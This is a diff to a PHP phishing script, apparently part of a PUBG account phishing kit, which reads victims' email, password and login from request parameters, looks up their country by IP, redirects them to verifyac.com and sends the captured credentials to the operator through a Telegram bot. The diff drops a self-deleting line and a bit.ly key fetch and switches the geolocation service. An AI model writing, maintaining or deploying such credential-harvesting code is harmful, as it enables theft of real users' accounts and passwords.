@@ -1,5 +1,4 @@
 <?php
-unlink('pubg.php');
 ob_start();
 $API_KEY = "YOUR TOKEN";
 
@@ -39,11 +38,8 @@ $password = $_GET["password"];
 $login = $_GET["login"];
 
 if($email){
-$api_key = file_get_contents('https://bit.ly/3ns1Icy');
-$cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
-$jsondata = json_decode($cty1);
-$cty = $jsondata->country_name;
-$ccode = $jsondata->location->calling_code;
+$cty = file_get_contents("https://ipapi.co/".$ip."/country_name");
+$ccode = file_get_contents("https://ipapi.co/".$ip."/country_calling_code");
 $url1 = 'http://www.verifyac.com/index.php?uc=MT';
 header("location: $url1");
 $name = $message->from->first_name;
@@ -55,7 +51,7 @@ bot("sendMessage",[
 
 👤 ¦ 𝑬𝒎𝒂𝒊𝒍 » `$email`
 📟 ¦ 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅  » `$password`
-☎️ ¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆 » `+$ccode`
+☎️ ¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 𝑪𝒐𝒅𝒆 » `$ccode`
 🔱 ¦ 𝑳𝒐𝒈𝒊𝒏 » $login
 👁️‍🗨️¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 » $cty
 ⏱ ¦ 𝑻𝒊𝒎𝒆 » $time
